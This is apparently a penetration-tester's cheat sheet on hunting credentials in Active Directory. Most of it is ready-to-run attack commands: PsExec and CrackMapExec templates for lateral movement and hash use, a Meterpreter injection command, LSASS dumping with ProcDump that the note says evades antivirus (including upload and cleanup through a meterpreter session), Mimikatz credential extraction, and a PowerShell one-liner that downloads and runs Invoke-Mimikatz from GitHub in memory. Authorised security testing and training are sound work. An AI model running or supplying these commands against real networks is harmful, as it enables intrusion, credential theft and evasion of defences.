# Active Directory - Credentials Hunting

### Account hunting

###### Session hunting with BloodHound

BloodHound uses graph theory to reveal the hidden and often unintended
relationships within an Active Directory environment. Attackers can use
BloodHound to easily identify highly complex attack paths that would otherwise
be impossible to quickly identify.

### Credentilas reuse

###### Locally use credentials

Set the main DNS server on the attacking computer to the Domain Controller IP
address:

```
Control Pannel -> Network and Internet -> Network and Sharing Center -> Change adapter setting -> right click on the adapter being used -> Properties -> Internet Protocol Version 4 (TCP/IPv4) -> Properties -> Set the Preferred DNS server field  
```

To authenticate locally as another user (with plaintext credentials) and
execute Powershell commands use:

```
# runas
runas /NetOnly /user:<DOMAIN>\<USERNAME> powershell.exe

# For the commands supporting PSCredential
$secpasswd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $secpasswd)
```

###### PsExec

The PsExec CLI utility, signed by Microsoft and from the sysinternals suite,
can be used to execute commands, locally or remotely and under the current
user or the specified user identity.  

While the use of a more complete attack framework is recommended on the
attacking machine (such as CrackMapExec), PsExec can be upload on a compromissed
host to hops on until now unreachable targets.

PsExec uses a named pipe with the Server Message Block (SMB) protocol, which
runs on TCP port 445. The PsExec tool requires that the executable be present
on the system performing the connection, but no additional software is
necessary on the target. Additionally, the credentials supplied to PsExec for
authentication must have elevated privileges on the targeted client machine.

```
# -s   Run the remote process in the System account.
# -i   Run the program so that it interacts with the desktop of the specified session on the remote system
# -d   Don't wait for process to terminate (non-interactive).

psexec [\\computer[,computer2[,...] | @file]] [-u user [-p psswd]] [-n s] [-r servicename] [-h] [-l] [-s|-e] [-x] [-i [session]] [-c [-f|-v]] [-w directory] [-d] [-<priority>][-a n,n,...] cmd [arguments]

# Current user identity
# Use the -s option to run as SYSTEM if needed
psexec.exe -accepteula \\<HOST | IP> -s -i -d cmd.exe
psexec.exe -accepteula \\<HOST | IP> -u <DOMAIN | WORJGROUP>\<USERNAME> -p <PASSWORD> -s -i -d cmd.exe
```

###### CrackMapExec

CrackMapExec is a "Swiss army knife for pentesting Windows/Active Directory
environments".  

CME can notably be used to test credentials (password or hashes) through SMB or
MSSQL for local administrator access on a large range of targets.

To quickly identity which servers or computers in the domain expose a SMB
service, AD queries and nmap can be used in combination (refer to the
Methodology - Domain Recon note).

As with PsExec, the credentials supplied for authentication must have elevated
privileges on the targeted system.

CME include multiples modules:

```
crackmapexec --list-modules

[*] empire_exec          Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] mimikittenz          Executes Mimikittenz
[*] rundll32_exec        Executes a command using rundll32 and Windows's native javascript interpreter
[*] com_exec             Executes a command using a COM scriptlet to bypass whitelisting
[*] tokenrider           Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials
[*] tokens               Enumerates available tokens using Powersploit's Invoke-TokenManipulation
[*] mimikatz             Executes PowerSploit's Invoke-Mimikatz.ps1 script
[*] powerview            Wrapper for PowerView's functions
[*] shellinject          Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
[*] enum_chrome          Uses Powersploit's Invoke-Mimikatz.ps1 script to decrypt saved Chrome passwords
[*] metinject            Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
[*] peinject             Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script
[*] eventvwr_bypass      Executes a command using the eventvwr.exe fileless UAC bypass
```

CME cheat sheet:

```
# TARGETS can be IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containg a list of targets

crackmapexec <TARGETS> [-M <MODULE> [-o <MODULE_OPTION>]] (-d <DOMAIN> | --local-auth) -u <USERNAME | USERNAMES_FILE> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>) [--sam] [-x <COMMAND> | -X <PS_COMMAND>]

# SAM
crackmapexec <TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# LSASS dump
crackmapexec <TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# Meterpreter
# msf exploit(handler) > set payload windows/meterpreter/reverse_https
crackmapexec <TARGETS> -M metinject -o LHOST=<HOST> LPORT=<PORT> -d <DOMAIN> -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
```

Note that:

  - the *--lsa* option dumps LSA secrets which can't be used in PtH attack and
    are harder to crack
  - The <TARGETS\> and <MODULE\> should be specified before the credentials as
    a CME bug could skip the targets / module otherwise
  - If the targeted host is unreachable, CME will exit with out returning any
    error message

### Credentials dumping

Credential dumping is the process of obtaining account login and password
information, normally in the form of a hash or a clear text password, from
the operating system.

On Windows, the users password are stored in the:

  - SAM (Security Account Manager) hive, storing the LM/NTLM hashes of local
    accounts for the host
  - LSASS (Local Security Authority Subsystem) process, storing clear-text
    passwords or LM/NTLM hashes of logged on users, Kerberos tickets, etc.
  - NTDS.dit (NT Directory Services.Directory Information Tree) file, which is
    the main AD database file, stored on Domain Controllers and containing,
    notably, the LM/NTLM hashes of all domain accounts.    

Administrators / SYSTEM privileges are required to access the information stored
in those files / processes.

###### Task manager

Since Vista, the Task Manager GUI utility tool can be used to easily dump the
lsass process:

```
Details -> Right click "lsass.exe" -> Create Dump File
```

###### ProcDump

ProcDump is a command-line utility tool signed by Microsoft and part of the
sysinternals suite.

It can be used to dump the lsass process with out raising any antivirus alert on
all Windows operating systems.

```
procdump.exe -accepteula -ma lsass.exe <PATH_DMPFILE>

# Trough a meterpreter session
upload <PATH/procdump.exe> C:
execute -f "C:\procdump.exe" -a '-accepteula -ma lsass.exe C:\lsass.dmp'
download C:\lsass.dmp
rm C:\lsass.dmp
```

###### Mimikatz

Mimikatz can be used to extract plaintexts passwords, hash, PIN code and
kerberos tickets from memory.  

It can be used:

  - By uploading the mimikatz released binary on the targeted system, which will
  almost certainly raise an antivirus alert
  - By uploading a custom mimikatz binary on the targeted system, which may
  raise an antivirus alert
  - Through the injection in memory of the Invoke-mimikatz PowerShell script
  (with CME or manually), which may raise an antivirus alert
  - Through a meterpreter session by using the mimikatz or kiwi modules, which
  may raise an antivirus alert
  - By extracting the LSASS process with the Task Manager or ProcDump utilities
  and using mimikatz off target  

```
# Direct use
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# From a lsass dump
mimikatz # privilege::debug
mimikatz # sekurlsa::minidump <LSASSDMP>
mimikatz # sekurlsa::logonpasswords

# PowerShell in memory injection
(New-Object System.Net.WebClient).Proxy.Credentials =  [System.Net.CredentialCache]::DefaultNetworkCredentials
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds;
```

### User-level third-party credentials

For user-level (non-admin privileged) sensitive data extraction refer to the
[Windows] Post Exploit note.
